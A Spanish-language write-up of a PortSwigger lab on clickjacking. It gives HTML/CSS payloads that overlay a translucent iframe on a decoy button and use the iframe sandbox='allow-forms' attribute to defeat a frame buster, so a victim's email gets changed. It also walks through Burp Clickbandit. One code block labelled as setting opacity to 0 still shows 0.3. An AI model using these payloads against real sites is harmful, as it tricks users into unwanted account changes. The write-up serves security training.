---
title: "Clickjacking with a frame buster script"
description: "Laboratorio de Portswigger sobre Clickjacking"
date: 2025-03-28 12:26:00 +0800
lang: es-ES
author: Justice-Reaper
categories:
  - Portswigger Labs
  - Clickjacking
tags:
  - Portswigger Labs
  - Clickjacking
  - Clickjacking with a frame buster script
image:
  path: /assets/img/Portswigger/Portswigger.png
---

## Certificaciones

- eWPT
- eWPTXv2
- OSWE
- BSCP
  
## Descripción

Este `laboratorio` está protegido por un `frame buster` que evita que el `sitio web` sea incrustado en un `frame`. Debemos encontrar una forma para cambiar la `dirección de correo electrónico` del usuario `bypasseando` un `frame buster` y engañar al `usuario` para que `haga click` en un botón de `"Actualizar correo electrónico"`, llevando así a cabo, un `ataque de Clickjacking`

El `laboratorio` se considerará resuelto cuando la `dirección de correo electrónico` haya sido cambiada. Podemos `iniciar sesión` en nuestra propia cuenta utilizando las credenciales `wiener:peter`

---

## Resolución

Al `acceder` a la `web` vemos esto

![](/assets/img/Clickjacking-Lab-3/image_1.png)

Si hacemos click sobre `My account` nos podemos `loguear` con las credenciales `wiener:peter`

![](/assets/img/Clickjacking-Lab-3/image_2.png)

Después de `iniciar sesión` vemos que podemos `cambiarnos` el `correo electrónico`

![](/assets/img/Clickjacking-Lab-3/image_3.png)

Si pulsamos sobre `View post` vemos que hay una sección de comentarios

![](/assets/img/Clickjacking-Lab-3/image_4.png)

Para ver si una `web` es `vulnerable` a `Clickjacking` podemos usar la herramienta `shcheck` [https://github.com/santoru/shcheck.git](https://github.com/santoru/shcheck.git()) para `identificar` las `cabeceras de seguridad`

```
# shcheck.py -i -x -k https://0a6a0005048fd811816ed403009c00d9.web-security-academy.net/

======================================================
 > shcheck.py - santoru ..............................
------------------------------------------------------
 Simple tool to check security headers on a webserver 
======================================================

[*] Analyzing headers of https://0a6a0005048fd811816ed403009c00d9.web-security-academy.net/
[!] URL Returned an HTTP error: 404
[*] Effective URL: https://0a6a0005048fd811816ed403009c00d9.web-security-academy.net/
[!] Missing security header: X-XSS-Protection
[!] Missing security header: X-Frame-Options
[!] Missing security header: X-Content-Type-Options
[!] Missing security header: Strict-Transport-Security
[!] Missing security header: Content-Security-Policy
[!] Missing security header: X-Permitted-Cross-Domain-Policies
[!] Missing security header: Referrer-Policy
[!] Missing security header: Expect-CT
[!] Missing security header: Permissions-Policy
[!] Missing security header: Cross-Origin-Embedder-Policy
[!] Missing security header: Cross-Origin-Resource-Policy
[!] Missing security header: Cross-Origin-Opener-Policy

[*] No information disclosure headers detected

[*] No caching headers detected
-------------------------------------------------------
[!] Headers analyzed for https://0a6a0005048fd811816ed403009c00d9.web-security-academy.net/
[+] There are 0 security headers
[-] There are not 12 security headers
```

Si preferimos usar una herramienta `web` podemos usar `securityheaders` [https://securityheaders.com/](https://securityheaders.com/) 

![](/assets/img/Clickjacking-Lab-3/image_5.png)

En este caso, vemos que la `web` no tiene ni `Content-Security-Policy (CSP)` ni `X-Frame-Options`, lo cual la hace vulnerable a `Clickjacking`

Algunos `sitios web` que requieren completar y enviar `formularios` permiten `rellenar previamente` los datos del `formulario` mediante `parámetros GET` antes del `envío`. Dado que los `valores GET` forman parte de la `URL`, la `URL de destino` puede `modificarse` para incorporar `valores elegidos por el atacante`

Hay otros `sitios web` que pueden requerir `interacción por parte del usuario`, como que el usuario `ingrese manualmente los datos`, complete `pasos previos` (como una `verificación CAPTCHA`) antes de `habilitar el envío`, etc

Para `comprobar` si `el formulario permite rellenar previamente los datos mediante parámetros GET`, lo primero que necesitamos hacer es `identificar` los `nombres` de los `campos`. En este caso vemos que el valor del campo a `rellenar` es `email`

![](/assets/img/Clickjacking-Lab-3/image_6.png)

El siguiente paso es `añadir` el `parámetro email` a la `URL` y ver si se `rellena` el `campo email del formulario`, para ello, accedemos a `https://0a0f00df03253f5280a3a31000330041.web-security-academy.net/my-account?email=pwned@gmail.com` y vemos que sí que funciona

![](/assets/img/Clickjacking-Lab-3/image_7.png)

Una vez comprobado esto, ya podemos `construir` un `payload`, para ello, nos dirigimos al `Exploit Server` y pegamos este `payload`

```
<style>
   iframe {
       position:relative;
       width: 500px;
       height: 700px;
       opacity: 0.3;
       z-index: 2;
   }
   div {
       position:absolute;
       top:450px;
       left:75px;
       z-index: 1;
   }
</style>
<div>Click me</div>
<iframe src="https://0a6a0005048fd811816ed403009c00d9.web-security-academy.net/my-account?email=pwned@gmail.com"></iframe>
```

![](/assets/img/Clickjacking-Lab-3/image_8.png)

Pinchamos sobre `View exploit` y nos `arroja` este `mensaje` de `error`

![](/assets/img/Clickjacking-Lab-3/image_9.png)

Los `ataques de Clickjacking` son posibles siempre que los `sitios web` puedan ser `cargados en un iframe`. Por lo tanto, las `técnicas de prevención` se basan en `restringir la capacidad de carga en iframes` para los `sitios web`

Una `protección del lado del cliente`, aplicada a través del `navegador web`, es el uso de `scripts de bloqueo de iframes`. Estos pueden implementarse mediante `complementos o extensiones de JavaScript` propietarias del `navegador`, por ejemplo, `NoScript`

Los `scripts` suelen diseñarse para realizar algunos o todos los siguientes `comportamientos`

- `Verificar y hacer cumplir` que la `ventana actual de la aplicación` sea la `ventana principal o superior`
    
- `Hacer visibles` todos los `iframes`
    
- `Prevenir clics` en `iframes invisibles`
    
- `Interceptar y alertar` al `usuario` sobre posibles `ataques de Clickjacking`

Las `técnicas de frame busting` suelen ser `específicas del navegador y la plataforma` y, debido a la `flexibilidad de HTML`, los `atacantes` pueden `eludirlas fácilmente`. Como los `frame busters` son `JavaScript`, la `configuración de seguridad del navegador` puede `impedir su ejecución` o incluso el `navegador` podría `no ser compatible con JavaScript`

Una `estrategia eficaz` para los `atacantes` contra los `frame busters` es el uso del `atributo sandbox` de `iframe` en `HTML5`. Cuando se configura con los valores `allow-forms` o `allow-scripts` y se `omite el valor allow-top-navigation`, el `script de frame busting` puede ser `neutralizado`, ya que el `iframe` no puede `verificar` si es la `ventana superior` o no

```
<iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms"></iframe>
```

Los valores `allow-forms` y `allow-scripts` permiten `acciones específicas` dentro del `iframe`, pero `deshabilitan la navegación de nivel superior`. Esto `inhibe el comportamiento de frame busting` mientras permite la `funcionalidad` dentro del `sitio web objetivo`

Una vez sabemos esto, nos dirigimos al `Exploit server` y `pegamos` el `nuevo exploit`

```
<style>
   iframe {
       position:relative;
       width: 500px;
       height: 700px;
       opacity: 0.3;
       z-index: 2;
   }
   div {
       position:absolute;
       top:450px;
       left:75px;
       z-index: 1;
   }
</style>
<div>Click me</div>
<iframe src="https://0a6a0005048fd811816ed403009c00d9.web-security-academy.net/my-account?email=pedro@gmail.com" sandbox="allow-forms"></iframe>
```

![](/assets/img/Clickjacking-Lab-3/image_10.png)

Si pulsamos sobre `View exploit` vemos que ahora `si` que `funciona` el `payload`

![](/assets/img/Clickjacking-Lab-3/image_11.png)

Como vemos que todo funciona correctamente, vamos a `cambiarle` la `opacidad` a `0`

```
<style>
   iframe {
       position:relative;
       width: 500px;
       height: 700px;
       opacity: 0.3;
       z-index: 2;
   }
   div {
       position:absolute;
       top:450px;
       left:75px;
       z-index: 1;
   }
</style>
<div>Click me</div>
<iframe src="https://0a6a0005048fd811816ed403009c00d9.web-security-academy.net/my-account?email=pedro@gmail.com" sandbox="allow-forms"></iframe>
```

![](/assets/img/Clickjacking-Lab-3/image_12.png)

Otra forma alternativa sería usando la herramienta `Clickbandit` de `Burpsuite`, para usarla nos dirigimos a `Burpsuite` y pulsamos `Burp > Burp Clickbandit`

![](/assets/img/Clickjacking-Lab-3/image_13.png)

Pulsamos sobre `Copy Clickbandit to clipboard`

![](/assets/img/Clickjacking-Lab-3/image_14.png)

Nos dirigimos a `Chrome`, nos abrimos la `consola de desarrollador` y `pegamos` ahí todo el `código`

![](/assets/img/Clickjacking-Lab-3/image_15.png)

Una vez hecho esto nos saldrá este `menú`

![](/assets/img/Clickjacking-Lab-3/image_16.png)

`Marcamos` la casilla `Disable click actions` para `desactivar` los `clicks` y la de `Sandbox iframe?` para `evitar` la `restricción` del `lado del cliente`. Debemos `eliminar` el atributo `allow-scripts` de `Sandbox iframe?` para que funcione. Una vez hecho esto pulsamos en `Start`

![](/assets/img/Clickjacking-Lab-3/image_17.png)

Lo siguiente sería `pulsar sobre el botón que queremos`, en este caso sobre `Update email` que es el que queremos usar para el `ataque de Clickjacking`

![](/assets/img/Clickjacking-Lab-3/image_18.png)

Una vez hecho esto, `pulsamos` sobre `Finish` y se nos `mostrará` como es nuestro `payload` actualmente

![](/assets/img/Clickjacking-Lab-3/image_19.png)

Usando los símbolos `-` y `+`, podemos `subir` o `bajar` el `aumento`, y con `Toogle transparency` podemos `activar` o `desactivar` la `transparencia`. En mi caso, lo voy a dejar de esta forma. Cuando ya lo tengamos como queremos, pulsamos en `Save` y se nos `descargará` un `documento HTML`

![](/assets/img/Clickjacking-Lab-3/image_20.png)

`Pegamos` el `código` en el `Exploit server`

![](/assets/img/Clickjacking-Lab-3/image_21.png)

Pulsamos sobre `View exploit` para ver si se ve correctamente

![](/assets/img/Clickjacking-Lab-3/image_22.png)

Hacemos `click sobre el botón`

![](/assets/img/Clickjacking-Lab-3/image_23.png)

Nos dirigimos a  `My account` para ver `si ha funcionado el ataque`, y vemos que así es. Una vez comprobado que se `ve` y `funciona` correctamente, pulsamos sobre `Deliver exploit to victim` y completamos el `laboratorio`. Debemos tener en cuenta que `dos usuarios no pueden tener el mismo email`, por lo tanto deberemos `modificar el nuestro o el email que se usa en el payload`

![](/assets/img/Clickjacking-Lab-3/image_24.png)


